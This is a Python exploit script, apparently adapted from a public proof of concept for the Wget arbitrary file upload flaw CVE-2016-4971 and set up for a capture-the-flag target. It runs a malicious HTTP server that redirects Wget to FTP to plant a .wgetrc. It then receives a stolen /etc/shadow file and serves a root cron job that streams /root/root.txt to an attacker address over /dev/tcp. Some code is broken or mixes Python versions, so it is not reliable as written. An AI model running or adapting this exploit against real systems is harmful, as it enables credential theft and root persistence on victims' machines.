#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
@author: d00ms(--)
@file: Wget_Arbitrary_Upload.py
@time: 2019-5-28 15:58
@desc: A new coquettish exploit of tool wget and tftpd.
"""

# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid@legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971
#

import http.server
import socketserver
import socket

class wgetExploit(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # This takes care of sending .wgetrc

        print("We have a volunteer requesting " + self.path + " by GET :)\n")
        if "Wget" not in self.headers.getheader('User-Agent'):
            print("But it's not a Wget :( \n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        print("Uploading .wgetrc via ftp redirect vuln. It should land in /root \n")
        self.send_response(301)
        new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
        print("Sending redirect to %s \n"%(new_path))
        self.send_header('Location', new_path)
        self.end_headers()

    def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

        print("We have a volunteer requesting " + self.path + " by POST :)\n")
        if "Wget" not in self.headers.getheader('User-Agent'):
            print("But it's not a Wget :( \n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return
        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        print("Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body))

        print("Sending back a cronjob script as a thank-you for the file...")
        print("It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)")
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(ROOT_CRON)

        print("\nFile was served. Check your root hash receiving in your 8888 web server in a minute! :) \n")

        return


HTTP_LISTEN_IP = '10.0.3.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.*.*'
FTP_PORT = 21

ROOT_CRON = "* * * * * root cat /root/root.txt > /dev/tcp/10.10.10.55/8888\n"

handler = socketserver.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print("Ready? Is your FTP server running?")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
    print("FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT))
else:
    print("FTP is down :( Exiting.")
    exit(1)

print("Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT)

handler.serve_forever()

